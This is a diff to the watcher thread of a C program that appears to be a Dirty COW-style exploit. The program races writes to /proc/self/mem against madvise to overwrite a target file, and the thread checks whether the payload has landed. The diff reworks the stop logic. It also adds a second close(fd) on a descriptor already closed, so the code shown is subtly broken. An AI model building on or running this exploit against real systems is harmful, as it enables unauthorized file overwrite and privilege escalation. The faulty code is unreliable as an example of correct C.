@@ -3,12 +3,15 @@
 #include <stdio.h>
 #include <stdint.h>
 #include <stdlib.h>
+
 #include <errno.h>
 #include <fcntl.h>
 #include <pthread.h>
 #include <string.h>
+
 #include <getopt.h>
 #include <unistd.h>
+
 #include <sys/stat.h>
 #include <sys/types.h>
 #include <sys/mman.h>
@@ -33,8 +36,7 @@
 		ERR_IF(_val > 0);      \
 	} while (0)
 
-#define VIRTUAL_MEMORY    "/proc/self/mem"
-#define THREAD_ITERATIONS 10000
+#define VIRTUAL_MEMORY "/proc/self/mem"
 
 char *progname = NULL;
 bool stop_thread = false;
@@ -79,7 +81,9 @@ static void *wait_for_write(void *arg) {
 	PayloadInfo *info = arg;
 	size_t len = strlen(info->payload);
 
-	while (true) {
+	while (!stop_thread) {
+		sleep(1);
+
 		char buf[len];
 		memset(buf, '\0', len);
 
@@ -93,17 +97,15 @@ static void *wait_for_write(void *arg) {
 		close(fd);
 		
 		if (memcmp(buf, info->payload, len) == 0) {
-			puts("Target file is overwritten");
-			break;
+			puts("Target file is overwritten. Stopping threads.");
+			stop_thread = true;
 		}
 
 		// Push this thread to back of run queue allowing "madvisor_thread" and "writer_thread"
 		// priority to run, this way after each examination, something new is guaranteed to possibly happen 
+		close(fd);
 		ERR_IF_PTHREAD(pthread_yield());
 	}
-
-	stop_thread = true;
-	puts("Stopping threads"); 
 
 	return NULL;
 }
